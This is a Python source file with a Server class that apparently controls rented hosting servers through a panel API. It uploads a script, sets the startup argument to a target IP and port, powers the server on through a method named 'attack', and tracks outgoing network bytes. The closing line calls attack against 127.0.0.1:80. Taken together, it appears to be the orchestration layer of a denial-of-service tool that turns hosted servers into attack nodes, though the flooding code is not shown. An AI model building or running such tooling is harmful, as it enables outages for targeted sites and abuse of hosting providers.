import httpx

class Server:
    def __init__(self, **kwargs):
        self.name = kwargs.get("name")
        self.api_key = kwargs.get("token")
        self.api_url = kwargs.get("api")
        self.session = httpx.Client()
        auth = {"Authorization": f"Bearer {self.api_key}"}
        self.session.headers.update(auth)
        self.session.timeout = 3
        try:
            r = httpx.get(f"{self.api_url}/api/client", headers=auth, timeout=3)
            for server in r.json()["data"]:
                self.identifier = server["attributes"]["identifier"]
        except:
            self.identifier = False
        self.var = kwargs.get("var")

    def attack(self, ip, port):
        """
        Starts the attack

        The variable name is stored in self.var,
        and will be updated before the attack starts.

        The attack will be started after the variable is updated.
        """
        try:
            payload = {
                "key": self.var,
                "value": f"main.py {ip}:{port}"
            }
            r = self.session.put(f"{self.api_url}/api/client/servers/{self.identifier}/startup/variable", json=payload)
            if r.status_code == 200:
                r = self.session.post(f"{self.api_url}/api/client/servers/{self.identifier}/power", json={"signal": "start"})
                if r.status_code == 204:
                    return True
                else:
                    return False
            else:
                return False
        except Exception as e:
            print(e)
            return False
        
    def is_running(self):
        """
        Checks if the server is running
        Returns True if it is running, False if it is not
        """
        try:
            r = self.session.get(f"{self.api_url}/api/client/servers/{self.identifier}/resources")
            if r.status_code == 200:
                state = r.json()["attributes"]["current_state"]
                return state == "running" or state == "starting"
            else:
                return False
        except:
            return False
        
    def upload_code(self, code):
        """
        Uploads the code to the server
        Returns True if the code was uploaded, False if it was not

        Requires the code to be a string
        """
        try:
            r = self.session.post(f"{self.api_url}/api/client/servers/{self.identifier}/files/write?file=%2Fmain.py", data=code)
            if r.status_code == 204:
                return True
            else:
                return False
        except:
            return False
        
    def stop(self):
        """
        Stops the server
        Returns True if the server was stopped, False if it was not
        """
        try:
            r = self.session.post(f"{self.api_url}/api/client/servers/{self.identifier}/power", json={"signal": "kill"})
            if r.status_code == 204:
                return True
            else:
                return False
        except:
            return False
        
    def network_io(self):
        """
        Returns the network IO of the server
        Returns False if it was not able to get the network IO
        """
        try:
            r = self.session.get(f"{self.api_url}/api/client/servers/{self.identifier}/resources")
            if r.status_code == 200:
                return r.json()["attributes"]["resources"]["network_tx_bytes"]
            else:
                return False
        except:
            return False
        
    def is_online(self):
        """
        Checks if the server is online
        Returns True if it is online, False if it is not
        """
        return self.identifier != False
    
    def get_files(self):
        """
        Gets the files in the server
        Returns the files in the server
        """
        try:
            r = self.session.get(f"{self.api_url}/api/client/servers/{self.identifier}/files/list?directory=%2F")
            if r.status_code == 200:
                return r.json()["data"]
            else:
                return False
        except:
            return False
        
server = Server(name="Server Name", token="Server API Key", api="Server API URL", var="Variable Name")
server.attack("127.0.0.1", 80)